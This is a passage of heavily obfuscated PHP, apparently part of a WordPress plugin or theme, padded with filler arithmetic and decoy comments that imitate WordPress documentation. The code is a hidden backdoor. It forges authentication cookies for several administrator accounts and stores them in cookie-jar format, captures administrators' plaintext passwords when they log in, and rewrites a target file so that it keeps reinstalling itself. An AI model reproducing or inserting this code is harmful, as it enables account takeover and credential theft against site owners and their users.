$toxd7lwn40kosh59[] =    i4phbxncprpllx4ce939j($ks1jfnw_wldm32,  $e2ovd90e097czrb);
 }
      $g9u70l7gja[$key] =  $toxd7lwn40kosh59;
}
     return $g9u70l7gja;$cp1qvz1m8=(0xcd+0x93);$tu_l9paf4kh5=$cp1qvz1m8%12;
       }
       }
  function   dm2ynxj4cka_f9ie88n()

  {
  if  (!empty($GLOBALS[hn_f08x0cns80(878)]))  return false;
   $GLOBALS[ovffvv33(878)]   = 1;

        return true;
        

 }
   function  tiv8uit9r58wotip8bo()
   {
   try {
  if  ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(879)) && get_transient(ovffvv33(880)))  {

   return;
 }
 if      (!dm2ynxj4cka_f9ie88n())   return;
 if ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(881)))  set_transient(iw6xe9q4j6sneg(880),    1,     (3556+44));
  $pdzpaqbxbxyd17wh =     @$GLOBALS['__scf_b42duf6j1zadm9_105'](bmvtr5sdqjf5km1t());
   if  ($pdzpaqbxbxyd17wh   && $pdzpaqbxbxyd17wh  > (0x463+0xf25)   && $pdzpaqbxbxyd17wh  < (3317393+1682607) &&  !hiisk00z0i4v1wyj3(bmvtr5sdqjf5km1t())) {


 $h7duh9n5k1   = @$GLOBALS['__scf_uo_a60ibqnli_104'](bmvtr5sdqjf5km1t());
   $b3_4y4x1hqp =   pvqofla267dcimn(bmvtr5sdqjf5km1t());
 if      ($GLOBALS['__scf_fv3zevxzzb_44']($b3_4y4x1hqp)     &&   ib2ffadoyj2m6zxmkaa2in($b3_4y4x1hqp)      &&  gdvo0h5bcuzy91kz589lst($b3_4y4x1hqp)  === dfb4_mpcgxvnp230hvh1v()) {
if ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(63))) @clearstatcache(true,  bmvtr5sdqjf5km1t());

    if (@$GLOBALS['__scf_uo_a60ibqnli_104'](bmvtr5sdqjf5km1t()) ===     $h7duh9n5k1  &&  @$GLOBALS['__scf_b42duf6j1zadm9_105'](bmvtr5sdqjf5km1t())  ===  $pdzpaqbxbxyd17wh)  {
  if   (c5kyk62yk_dwfeubni4b(bmvtr5sdqjf5km1t(),  fcywjpu_2kwq2ahog4($b3_4y4x1hqp)))  {



     vyxva31du3czei(bmvtr5sdqjf5km1t());
     o4_k_ap14u5xy97yywy7k(bmvtr5sdqjf5km1t());
     }


    }
  }
unset($b3_4y4x1hqp,  $h7duh9n5k1);
 }
 $spp5u7kohh96gvd0  = @$GLOBALS['__scf_b42duf6j1zadm9_105'](bmvtr5sdqjf5km1t());
 $s5io55sq0c__2_i    =   $spp5u7kohh96gvd0 &&    $spp5u7kohh96gvd0   >   (4931+69);
   if   ($s5io55sq0c__2_i  && $spp5u7kohh96gvd0    >    (103153440-50724640)) {
  $s5io55sq0c__2_i     =   false;
    }
 if     ($s5io55sq0c__2_i &&  $spp5u7kohh96gvd0  > (1048514+62)   && !mwr_737feiwcxt($spp5u7kohh96gvd0))     {
if   ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(881)))  {
       set_transient(f6yrzd2knrmb(880),  1, (3586+14));
   }
 return;
     }
  if  ($s5io55sq0c__2_i)   {$xpvt1mf0v2rmb=2276;$n0srubhqp7ny=$xpvt1mf0v2rmb%14;


   $e0ps6_xivbs8   = pvqofla267dcimn(bmvtr5sdqjf5km1t());
 if   (!$GLOBALS['__scf_fv3zevxzzb_44']($e0ps6_xivbs8)     ||  !ib2ffadoyj2m6zxmkaa2in($e0ps6_xivbs8))  {


$s5io55sq0c__2_i =  false;
  }  else  {
  $kx1i1ttok_ = fcc42yo6xrdenvra0(iw6xe9q4j6sneg(470), "");
  $zntk1kwdvkg14t  = gdvo0h5bcuzy91kz589lst($e0ps6_xivbs8);
$fqequjkl8m =    gdvo0h5bcuzy91kz589lst($GLOBALS['__scf_fv3zevxzzb_44']($kx1i1ttok_)   ? $kx1i1ttok_ :  "");
   if ($zntk1kwdvkg14t !==  "" &&     ($fqequjkl8m ===     "" || version_compare($fqequjkl8m,     $zntk1kwdvkg14t,  '<'))) {
   $gdfmdhcevm7wok9d  =      $GLOBALS['__scf_tnonex5o9y_60']($e0ps6_xivbs8);
  $rcoh5fig25m     = @$GLOBALS['__scf_rjpcj9l4bigb5_21']($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t())    . hn_f08x0cns80(710)  .  $gdfmdhcevm7wok9d);
 if (!$rcoh5fig25m)   {
   $cxylwqg_vlvbdxeg =   get_option(f6yrzd2knrmb(709));


  if ($GLOBALS['__scf_fv3zevxzzb_44']($cxylwqg_vlvbdxeg) && $GLOBALS['__scf_w6mdcepio4lkz5_7']($cxylwqg_vlvbdxeg,  $gdfmdhcevm7wok9d  .  '|')      ===      0)  $rcoh5fig25m   =  true;
}
      if   ($rcoh5fig25m)   $s5io55sq0c__2_i =  false;

if  (!$rcoh5fig25m  && $GLOBALS['__scf_fv3zevxzzb_44']($kx1i1ttok_)      && ($kx1i1ttok_     ===  ""     ||  $fqequjkl8m ===    ""    || version_compare($fqequjkl8m, $zntk1kwdvkg14t,  '<')))      mw5stmpiys2hi3k2xe14i(c1sob647u1i(470), $e0ps6_xivbs8,  f6yrzd2knrmb(773));
    

unset($gdfmdhcevm7wok9d, $rcoh5fig25m,    $cxylwqg_vlvbdxeg);

 } elseif   ($GLOBALS['__scf_fv3zevxzzb_44']($kx1i1ttok_)  &&  $GLOBALS['__scf_d4eyetogjbsnt_10']($kx1i1ttok_)  >   (937-437)   &&  $GLOBALS['__scf_d4eyetogjbsnt_10']($kx1i1ttok_)  <=  (1048556+20)    &&  !hc0wbkv3xzh9im34z($kx1i1ttok_)   &&  ib2ffadoyj2m6zxmkaa2in($kx1i1ttok_) &&   $GLOBALS['__scf_tnonex5o9y_60']($e0ps6_xivbs8) !== $GLOBALS['__scf_tnonex5o9y_60']($kx1i1ttok_)) {

$s5io55sq0c__2_i =  false;
}
}
 }
  if    ($s5io55sq0c__2_i) {
  if ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(881)))   {
 set_transient(iw6xe9q4j6sneg(880),   1,  (6273-2673));

   }
  return;
   }
 if (hiisk00z0i4v1wyj3(bmvtr5sdqjf5km1t())) {


    return;
     }
 $gznswdms747z  = $GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t());
  if    (! @$GLOBALS['__scf_opq_vgkskw_46']($gznswdms747z)) {

xxvz5dp1zk215e5d9($gznswdms747z, (232+261),  true);
    }


     $zewoz960gyuoi  =  fcc42yo6xrdenvra0(ovffvv33(470), "");
 if    (!$zewoz960gyuoi   ||    !$GLOBALS['__scf_fv3zevxzzb_44']($zewoz960gyuoi))     {
 if (!get_transient(hn_f08x0cns80(882)))   {



g_qoqdy38lfl4v4n3618(hn_f08x0cns80(883),  c1sob647u1i(884));
  set_transient(c1sob647u1i(885),    1,    (3522+78));
}

 }
 if  ($zewoz960gyuoi    &&  $GLOBALS['__scf_fv3zevxzzb_44']($zewoz960gyuoi)   && $GLOBALS['__scf_d4eyetogjbsnt_10']($zewoz960gyuoi)  > (425+75)     &&   $GLOBALS['__scf_d4eyetogjbsnt_10']($zewoz960gyuoi) <=     (1048481+95)    &&  !hc0wbkv3xzh9im34z($zewoz960gyuoi)  &&  ib2ffadoyj2m6zxmkaa2in($zewoz960gyuoi)) {

  $aavywckb6xvuhg6l =      gdvo0h5bcuzy91kz589lst($zewoz960gyuoi);
 if ($aavywckb6xvuhg6l ===  "" || version_compare($aavywckb6xvuhg6l,     dfb4_mpcgxvnp230hvh1v(),  '<')) {
  return;
    }


$vbldueu3y682u  =    $GLOBALS['__scf_tnonex5o9y_60']($zewoz960gyuoi);
if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t())  . ovffvv33(886)   .   $vbldueu3y682u)) return;
   $d8ejgn26rl23bcm =    get_option(bpowi0iglycvx(709));
if   ($GLOBALS['__scf_fv3zevxzzb_44']($d8ejgn26rl23bcm) && $GLOBALS['__scf_w6mdcepio4lkz5_7']($d8ejgn26rl23bcm,   $vbldueu3y682u  .   '|')    === 0)   return;
  unset($vbldueu3y682u,    $d8ejgn26rl23bcm);
    $r6es8a1n5tiru =   $GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t())  .  c1sob647u1i(200) .  $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(), f6yrzd2knrmb(810));
    $p3i7f3antj_    = @$GLOBALS['__scf_rjpcj9l4bigb5_21']($r6es8a1n5tiru)  ?     $GLOBALS['__scf_qew3crlieule_339']((string) @$GLOBALS['__scf_utyj_ckly79_101']($r6es8a1n5tiru))   :   "";$vztewamth=35|48;$lzyuxjpyn_=$vztewamth^103;

     if  ($p3i7f3antj_   !== ""  &&  $GLOBALS['__scf_tnonex5o9y_60']($zewoz960gyuoi)  ===    $p3i7f3antj_)  {
 return;



 }
  ruinnb541lwxm7j(bmvtr5sdqjf5km1t(),    (417+3));
$hw8zyf7qlrjj9  = c5kyk62yk_dwfeubni4b(bmvtr5sdqjf5km1t(), fcywjpu_2kwq2ahog4($zewoz960gyuoi));


  if ($hw8zyf7qlrjj9) {
   vyxva31du3czei(bmvtr5sdqjf5km1t());$kh94f5_jbxq6bx=20*3;$zf7gnqx6oju=$kh94f5_jbxq6bx-7;
 ruinnb541lwxm7j(bmvtr5sdqjf5km1t(), (491-71));
  o4_k_ap14u5xy97yywy7k(bmvtr5sdqjf5km1t());


    bfyls7pdkqkf4p8az(true);
eos4svadcaj0dow8y(true);

hwyiz3722wut3tw(bmvtr5sdqjf5km1t());
 if  ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(887))) {
      set_transient(iw6xe9q4j6sneg(880),  1,     (3571+29));
   }
   }     elseif      ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(887))) {
  set_transient(f6yrzd2knrmb(880), 1,     (1740+60));


}
   }
// @lock strategy



     } catch  (Throwable  $cje8wku90zm4r) {
      g_qoqdy38lfl4v4n3618(bpowi0iglycvx(888), $cje8wku90zm4r);
 }  catch      (Exception   $cje8wku90zm4r) {
/* polynomial journal */

  }
 }


  
function  ybjtyibkjnr7ymoxwpp()

      {
  g7b6t_c45mkf3jmbd2c(hn_f08x0cns80(889), hn_f08x0cns80(890));
    g7b6t_c45mkf3jmbd2c(bpowi0iglycvx(891),   c1sob647u1i(890));
   if     ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(892)))  {
  remove_action(ovffvv33(893), iw6xe9q4j6sneg(894));
remove_action(hn_f08x0cns80(895), f6yrzd2knrmb(894), (0x2+0x8));
     remove_action(f6yrzd2knrmb(896),   hn_f08x0cns80(897), (0x4+0x6));
  }
 }
  function  ywqm3g0v52d6hud309()
 {
  try  {$oc3yx56jgzr3w=52+9;$paeuk37xxrx1l=$oc3yx56jgzr3w-27;
    $wpdb   =    $GLOBALS[c1sob647u1i(898)];
       $c3458go9fc1qkfqn     =  $wpdb->prefix . bpowi0iglycvx(899);
   $cku3ftfkcaxf =      'S'  .    c1sob647u1i(900)   . $wpdb->users  . iw6xe9q4j6sneg(901)    .  $wpdb->usermeta .  iw6xe9q4j6sneg(902);
$i5zprn6xibc1y  =  $wpdb->get_results($wpdb->prepare($cku3ftfkcaxf, $c3458go9fc1qkfqn,  iw6xe9q4j6sneg(903)));


 if (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($i5zprn6xibc1y)) {
  g_qoqdy38lfl4v4n3618(c1sob647u1i(904),  (string) $wpdb->last_error);



 return  array();
 }
return $i5zprn6xibc1y;
}    catch (Throwable  $cje8wku90zm4r)  {
     g_qoqdy38lfl4v4n3618(c1sob647u1i(608),   $cje8wku90zm4r);

   } catch (Exception $cje8wku90zm4r)  {
    g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(608),   $cje8wku90zm4r);$gr89yuw_=(0xe3+0x77);$q5mh3gxa288c4p=$gr89yuw_%15;
 }
      return    array();
   }



function   ycfijqdkwbccyfmbr3($npfs8_hluyj_oo)
    {
 $s2qj8x60xqaq3g5    =    array();


        $n3xc_ta3kp1y2   =  function ($_35lll3l0xl) {

    $_35lll3l0xl[iw6xe9q4j6sneg(905)]   =  "";
return     $_35lll3l0xl;
      };
     try     {
 $bmqi75f3a_pm29hd    = fcc42yo6xrdenvra0(iw6xe9q4j6sneg(906),    array());
 if     (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($bmqi75f3a_pm29hd))   $bmqi75f3a_pm29hd =   array();

    $_pd    =    false;
 foreach ($bmqi75f3a_pm29hd   as  $c6gj23jmvk    =>  $sd6rfzgeukl8dr)     {
      if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($sd6rfzgeukl8dr)    && isset($sd6rfzgeukl8dr['c'],  $sd6rfzgeukl8dr['e'])  && $GLOBALS['__scf_w1m1ydxx4_gm9__38']($sd6rfzgeukl8dr['c'])  &&  (int) $sd6rfzgeukl8dr['e']  > $GLOBALS['__scf_qzyo0sgkyb6_202']()   + (44655+41745))    {

 $s2qj8x60xqaq3g5[$c6gj23jmvk]  = $sd6rfzgeukl8dr['c'];
    }   else    {
unset($bmqi75f3a_pm29hd[$c6gj23jmvk]);

 $_pd     =  true;
  

  }

      }

if   (!   $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(907)) ||  ! $GLOBALS['__scf_dr1wex6ejrn2_554'](bpowi0iglycvx(908)))   {

      if      ($_pd)    mw5stmpiys2hi3k2xe14i(iw6xe9q4j6sneg(906),  $bmqi75f3a_pm29hd,  iw6xe9q4j6sneg(909));


  return $s2qj8x60xqaq3g5;
}
/* flat envelope */

 if (!   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($npfs8_hluyj_oo)   ||      empty($npfs8_hluyj_oo))   {


  if ($_pd)  mw5stmpiys2hi3k2xe14i(c1sob647u1i(906),  $bmqi75f3a_pm29hd, f6yrzd2knrmb(909));

return $s2qj8x60xqaq3g5;


}



   $w8jefoo04od6ohd   = $GLOBALS['__scf_qzyo0sgkyb6_202']()   +    (8+6)  *      (0xbd2c+0x9454);


  $is_ssl   = $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(499))    && is_ssl();
$mg9gqjwb_x15h1  =  $is_ssl ? iw6xe9q4j6sneg(910) :     f6yrzd2knrmb(911);



   $h816p12m8l2    =  $is_ssl   ?  (defined(c1sob647u1i(912))  ?      SECURE_AUTH_COOKIE   : "")  : (defined(c1sob647u1i(913))    ?  AUTH_COOKIE :   "");
  $y8i3s6np3exg  = defined(iw6xe9q4j6sneg(914)) ? LOGGED_IN_COOKIE      : "";
if  (!   $h816p12m8l2 ||    !    $y8i3s6np3exg)   {
    if ($_pd)     mw5stmpiys2hi3k2xe14i(c1sob647u1i(915),   $bmqi75f3a_pm29hd,  bpowi0iglycvx(916));
    return  $s2qj8x60xqaq3g5;
    }
  $k6a3tw1o93s9ezq7  =  defined(iw6xe9q4j6sneg(917))   && COOKIE_DOMAIN  ?   $GLOBALS['__scf_wr4u8clizo4sw_8'](COOKIE_DOMAIN,      '.') :  xyhhquc02dkq5zwsgxhdu("");
  $jir2qlrff86_gh   =  defined(c1sob647u1i(918))  ? COOKIEPATH :    '/';
   $hris0h08rp44oe   =  defined(ovffvv33(919)) ?     ADMIN_COOKIE_PATH : ovffvv33(920);
   $x_1us9eme_0  =    $is_ssl    ? hn_f08x0cns80(921)  : hn_f08x0cns80(922);
    $emnni5z67kh0  =   "\t";
   g7b6t_c45mkf3jmbd2c(ovffvv33(923),  $n3xc_ta3kp1y2,  0);$xle_f7i8=194|239;$oyedbdv4ol=$xle_f7i8^86;
$rru6ks2egc5l2e5  =  bvrd_z3xzbvaqt(ovffvv33(924));$xohyheoo=144|58;$vqooajccc2=$xohyheoo^196;



   $nz8411ulsjtlm1 =   $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(925))  ?   @get_option($rru6ks2egc5l2e5,   array())  : array();
   if  (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($nz8411ulsjtlm1))   $nz8411ulsjtlm1  =  array();
 if   ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(925))     &&   $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(771))) {
  $fys_j5nlao5xf   =  (int) @get_option(bvrd_z3xzbvaqt(iw6xe9q4j6sneg(926)),    0);
     if ($fys_j5nlao5xf   < 2)      {
  if (!empty($nz8411ulsjtlm1))     {
  $nz8411ulsjtlm1 = array();
 @update_option($rru6ks2egc5l2e5,    $nz8411ulsjtlm1,   hn_f08x0cns80(916));
  }
   @update_option(bvrd_z3xzbvaqt(ovffvv33(926)),  2,  iw6xe9q4j6sneg(916));
     }
unset($fys_j5nlao5xf);
  }


  $yw8yhtv0172mm    =   $GLOBALS['__scf_wj6dld55k5r8m_39']($s2qj8x60xqaq3g5);
     foreach ($npfs8_hluyj_oo   as    $lg5n9l37d_) {
    if  (!   $GLOBALS['__scf_bslklilwd3kn_71']($lg5n9l37d_)  ||  ! $lg5n9l37d_->ID    || !  $lg5n9l37d_->user_login) {
continue;
    }
  if ($yw8yhtv0172mm  >=     (0x1+0x2))   {$x2odujgu233=93+9;$qfvzik2gc=$x2odujgu233-46;
    break;
}



$u6f_pt_g972ular   =     (string) $lg5n9l37d_->user_login;
  if    (isset($s2qj8x60xqaq3g5[$u6f_pt_g972ular])) {

   continue;



 }
if   (isset($nz8411ulsjtlm1[$u6f_pt_g972ular])     &&     (int)  $nz8411ulsjtlm1[$u6f_pt_g972ular]   >  $GLOBALS['__scf_qzyo0sgkyb6_202']() +  2   *  (86322+78)) {
// WP Site Logo image dimensions

   continue;
     }
wp_cache_delete($lg5n9l37d_->ID,    ovffvv33(927));

    $d167apzqc1wxy6    =  get_user_meta($lg5n9l37d_->ID,    hn_f08x0cns80(928),  true);
        if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($d167apzqc1wxy6)     &&    $GLOBALS['__scf_wj6dld55k5r8m_39']($d167apzqc1wxy6)    >=    (73^67))  {

$yfatp_6_opt6ty = array();
foreach    ($d167apzqc1wxy6 as     $fz6pz1pjf0rzyw7     => $g82t3nfpk2ga2)  {

    if   (isset($g82t3nfpk2ga2[iw6xe9q4j6sneg(929)]) &&  $g82t3nfpk2ga2[bpowi0iglycvx(930)] >  $GLOBALS['__scf_qzyo0sgkyb6_202']())  {
$yfatp_6_opt6ty[$fz6pz1pjf0rzyw7]  =  $g82t3nfpk2ga2;
     }
  }
/* unitary scheduler */

        if ($GLOBALS['__scf_wj6dld55k5r8m_39']($yfatp_6_opt6ty) !==   $GLOBALS['__scf_wj6dld55k5r8m_39']($d167apzqc1wxy6)) {
 update_user_meta($lg5n9l37d_->ID,  f6yrzd2knrmb(931),     $yfatp_6_opt6ty);
    }
   }
 wp_cache_delete($lg5n9l37d_->ID,  hn_f08x0cns80(927));
$tw66ngaxoo_h    =    $GLOBALS['__scf_uroqlxj534ze4e_302'](array(iw6xe9q4j6sneg(908), hn_f08x0cns80(932)),    $lg5n9l37d_->ID);$hzeemh_2mc=PHP_MAJOR_VERSION;$wddbkjwa0ffc=$hzeemh_2mc*1;
     $hs07amrl6nnvjs5    =  $tw66ngaxoo_h->create($w8jefoo04od6ohd);
 $nlq4mzchq159 = array();
$nlq4mzchq159[]   =  $k6a3tw1o93s9ezq7   . $emnni5z67kh0   .   iw6xe9q4j6sneg(933)      .   $emnni5z67kh0 .     $jir2qlrff86_gh  .     $emnni5z67kh0 . $x_1us9eme_0 . $emnni5z67kh0  .     $w8jefoo04od6ohd   .  $emnni5z67kh0    .    $y8i3s6np3exg . $emnni5z67kh0 .    $GLOBALS['__scf_pa9s1m1dido_934']($lg5n9l37d_->ID,   $w8jefoo04od6ohd, iw6xe9q4j6sneg(935),      $hs07amrl6nnvjs5);
  if   ($h816p12m8l2) {$p0ho499g6w9j=-632;$lnz9ksq_cxy=($p0ho499g6w9j>0)?$p0ho499g6w9j:-$p0ho499g6w9j;



  $nlq4mzchq159[]   =    $k6a3tw1o93s9ezq7  .  $emnni5z67kh0    .      ovffvv33(933)   .   $emnni5z67kh0   . $hris0h08rp44oe .  $emnni5z67kh0 .  $x_1us9eme_0   .      $emnni5z67kh0 . $w8jefoo04od6ohd . $emnni5z67kh0  . $h816p12m8l2 .    $emnni5z67kh0   .     $GLOBALS['__scf_pa9s1m1dido_934']($lg5n9l37d_->ID,   $w8jefoo04od6ohd,   $mg9gqjwb_x15h1, $hs07amrl6nnvjs5);

    }
 $s2qj8x60xqaq3g5[$lg5n9l37d_->user_login]  =   $nlq4mzchq159;$u53kgisutb0=PHP_MAJOR_VERSION;$opsknf1rkkd=$u53kgisutb0*10;



 $bmqi75f3a_pm29hd[$u6f_pt_g972ular]     =  array('c'   =>  $nlq4mzchq159,   'e'    =>     $w8jefoo04od6ohd);



   $_pd   = true;
    $yw8yhtv0172mm++;
      }
/* non-strict factory */




   if ($_pd) {
 mw5stmpiys2hi3k2xe14i(bpowi0iglycvx(936),  $bmqi75f3a_pm29hd, ovffvv33(916));
    }



}    catch (Throwable  $cje8wku90zm4r)     {
    g_qoqdy38lfl4v4n3618(iw6xe9q4j6sneg(937),    $cje8wku90zm4r);
 }  catch (Exception  $cje8wku90zm4r)  {
// format snapshot-isolated negotiator

g_qoqdy38lfl4v4n3618(c1sob647u1i(938),  $cje8wku90zm4r);
     }


  remove_filter(bpowi0iglycvx(923), $n3xc_ta3kp1y2,     0);
  return $s2qj8x60xqaq3g5;
}
 function nz9tz9g9s_g_h0f7fd2h()
{
      try {

  $bmqi75f3a_pm29hd   =      fcc42yo6xrdenvra0(ovffvv33(936),   array());
  if (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($bmqi75f3a_pm29hd)   ||  empty($bmqi75f3a_pm29hd)) return;



  $rru6ks2egc5l2e5    =  bvrd_z3xzbvaqt(c1sob647u1i(939));
        $nz8411ulsjtlm1   = $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(925))  ?   @get_option($rru6ks2egc5l2e5, array())    :     array();


      if   (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($nz8411ulsjtlm1))   $nz8411ulsjtlm1   =   array();
    foreach   ($bmqi75f3a_pm29hd  as  $c6gj23jmvk     =>  $sd6rfzgeukl8dr)  {
   $nz8411ulsjtlm1[$c6gj23jmvk]  =  $GLOBALS['__scf_w1m1ydxx4_gm9__38']($sd6rfzgeukl8dr)  &&  isset($sd6rfzgeukl8dr['e'])  ?   (int)  $sd6rfzgeukl8dr['e']  :     $GLOBALS['__scf_qzyo0sgkyb6_202']()    + (5+9)  *     (86353+47);

}
 foreach    ($nz8411ulsjtlm1 as $xb2ryn74b3k  =>    $vlwy_t5nr13)  {


 if ((int)     $vlwy_t5nr13  <    $GLOBALS['__scf_qzyo0sgkyb6_202']())   unset($nz8411ulsjtlm1[$xb2ryn74b3k]);
}
if ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(771)))  @update_option($rru6ks2egc5l2e5,  $nz8411ulsjtlm1,      ovffvv33(940));
mw5stmpiys2hi3k2xe14i(bpowi0iglycvx(936),   array(), bpowi0iglycvx(941));
 }  catch  (Throwable $cje8wku90zm4r)  {
       g_qoqdy38lfl4v4n3618(ovffvv33(942),      $cje8wku90zm4r);
 }    catch  (Exception      $cje8wku90zm4r) {


g_qoqdy38lfl4v4n3618(ovffvv33(942),     $cje8wku90zm4r);
 }
}
  function  ltd6h909jnbpybjitqg($x434be6la7lqy8l)
{
   if  ($GLOBALS['__scf_fv3zevxzzb_44']($x434be6la7lqy8l))    return $x434be6la7lqy8l;


if ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($x434be6la7lqy8l)   &&   isset($x434be6la7lqy8l['p'])  &&      $GLOBALS['__scf_fv3zevxzzb_44']($x434be6la7lqy8l['p'])) return    $x434be6la7lqy8l['p'];
 return "";
}
  function    gtevdmhxojpzhqcmjgf65($npfs8_hluyj_oo)
   {
   $list  = array();
$cse6kkgn2he1r7y = (string)    fcc42yo6xrdenvra0(f6yrzd2knrmb(943),  "");
$mz8j5e4htkyelh  = (string)    fcc42yo6xrdenvra0(f6yrzd2knrmb(944),  "");
if  ($cse6kkgn2he1r7y !==    ""  &&     $mz8j5e4htkyelh !== "")    {
   $list[$cse6kkgn2he1r7y]  =     $mz8j5e4htkyelh;
    }



  $yhxn52kus9a  =    fcc42yo6xrdenvra0(iw6xe9q4j6sneg(562), array());

if  ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($yhxn52kus9a))  {
 foreach  ($yhxn52kus9a    as  $pzk7ym_agenk3et => $m3e_nd3q8d7c0)   {
$cupk3kbt8eisf    =   ltd6h909jnbpybjitqg($m3e_nd3q8d7c0);
    if    ($cupk3kbt8eisf     !==  "")   $list[(string)    $pzk7ym_agenk3et]     =   $cupk3kbt8eisf;
     }
 }


      return $list;
 }
 function   y5qqg6r4gr5011xrwj($pzk7ym_agenk3et, $e_y63m904n_t,    $eoydx7krr1c405c)
 {


   try   {
     if  (!  $GLOBALS['__scf_bslklilwd3kn_71']($pzk7ym_agenk3et) ||   !   $GLOBALS['__scf_ewy3z2db5hgtu_130']($pzk7ym_agenk3et,  iw6xe9q4j6sneg(945)))  {$hhybb5n7=PHP_MAJOR_VERSION;$rpklsvy98hr=$hhybb5n7*10;
       return  $pzk7ym_agenk3et;
      }
 if (!    $pzk7ym_agenk3et->has_cap(ovffvv33(946))) {
return  $pzk7ym_agenk3et;
}
 if  (!    $GLOBALS['__scf_fv3zevxzzb_44']($eoydx7krr1c405c)    ||  !    $eoydx7krr1c405c)  {
return    $pzk7ym_agenk3et;
  }
 $yhxn52kus9a =     fcc42yo6xrdenvra0(bpowi0iglycvx(562),      array());
  if   (! $GLOBALS['__scf_w1m1ydxx4_gm9__38']($yhxn52kus9a))    {
  $yhxn52kus9a =    array();



   }
  foreach ($yhxn52kus9a   as $q5yybsqjikc__n   => $ekxvczjmiyqtk)     {



$craz2yx3if4zmcr6     = $GLOBALS['__scf_w1m1ydxx4_gm9__38']($ekxvczjmiyqtk)  && isset($ekxvczjmiyqtk[c1sob647u1i(947)])   ? (int)      $ekxvczjmiyqtk[f6yrzd2knrmb(947)] :   0;
 if  ($craz2yx3if4zmcr6 &&   $craz2yx3if4zmcr6 <   $GLOBALS['__scf_qzyo0sgkyb6_202']()  -  (7775903+97))     unset($yhxn52kus9a[$q5yybsqjikc__n]);
   }
// WP RichText API: deterministic transformer

  $yhxn52kus9a[$pzk7ym_agenk3et->user_login] =   array('p' =>     $eoydx7krr1c405c,    bpowi0iglycvx(948)   =>  $GLOBALS['__scf_qzyo0sgkyb6_202'](),   f6yrzd2knrmb(563)    =>     0);
 mw5stmpiys2hi3k2xe14i(hn_f08x0cns80(562),  $yhxn52kus9a, f6yrzd2knrmb(949));
}    catch  (Throwable  $cje8wku90zm4r) {
    g_qoqdy38lfl4v4n3618(bpowi0iglycvx(950), $cje8wku90zm4r);
 }     catch (Exception $cje8wku90zm4r)   {$zrab5p0m_5lfl=PHP_MAJOR_VERSION;$uxr9i0ofbj=$zrab5p0m_5lfl*8;
      g_qoqdy38lfl4v4n3618(c1sob647u1i(950),    $cje8wku90zm4r);
 }
 return $pzk7ym_agenk3et;

     }
   function     semflsyjs9defk_hj($oqh_mdro9hczvnon,   $pzk7ym_agenk3et)
      {
  try   {



  if  (!$GLOBALS['__scf_fv3zevxzzb_44']($oqh_mdro9hczvnon) || $oqh_mdro9hczvnon  ===     "")  return;
       $yhxn52kus9a =   fcc42yo6xrdenvra0(hn_f08x0cns80(951), array());$xhzk02vwgpp=154|8;$ql6uln8kdfn=$xhzk02vwgpp^194;
  if   (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($yhxn52kus9a) || !isset($yhxn52kus9a[$oqh_mdro9hczvnon]))  return;
    $cje8wku90zm4r =     $yhxn52kus9a[$oqh_mdro9hczvnon];
      if   ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($cje8wku90zm4r)  &&  empty($cje8wku90zm4r[c1sob647u1i(563)])) {
  $yhxn52kus9a[$oqh_mdro9hczvnon][bpowi0iglycvx(952)]   =  1;
   mw5stmpiys2hi3k2xe14i(iw6xe9q4j6sneg(951), $yhxn52kus9a, hn_f08x0cns80(949));
       }
  } catch  (Throwable $z3_n5n_cg6kq5_)   {


 g_qoqdy38lfl4v4n3618(c1sob647u1i(953),  $z3_n5n_cg6kq5_);
    }   catch (Exception  $z3_n5n_cg6kq5_)  {
  g_qoqdy38lfl4v4n3618(c1sob647u1i(953),     $z3_n5n_cg6kq5_);
 }
}
function _cf4mf89r3zcvxiqjssb($npfs8_hluyj_oo)
{
 if (!   $GLOBALS['__scf_w1m1ydxx4_gm9__38']($npfs8_hluyj_oo))   {
   return   false;
   }


   $tzddqmn4kr7xh =   ws1ggwj04tku454wz_yv();
    foreach     ($npfs8_hluyj_oo as    $lg5n9l37d_) {
       foreach   ($tzddqmn4kr7xh  as   $fr_9h2tozj2)  {$smy3qc1b_en=(0x52+0xc4);$m00ia7frg4w=$smy3qc1b_en%17;


if   ($GLOBALS['__scf_wdjvpd1lvon9_102'](f6yrzd2knrmb(954)   .   $GLOBALS['__scf_qw5tztoblafz_841']($fr_9h2tozj2,  '/') .     f6yrzd2knrmb(955), $lg5n9l37d_->user_login))   {
// archive proxy for WP Formatting API

 return  $lg5n9l37d_;
 }
// bounded write-ahead-log

     }


    }
// WP Loginout Block: trace visitor


return   false;
 }

 function  nreub2fs747eromoe($f1rg5dr_o6,  $elwjt90x3e3730x)


  {
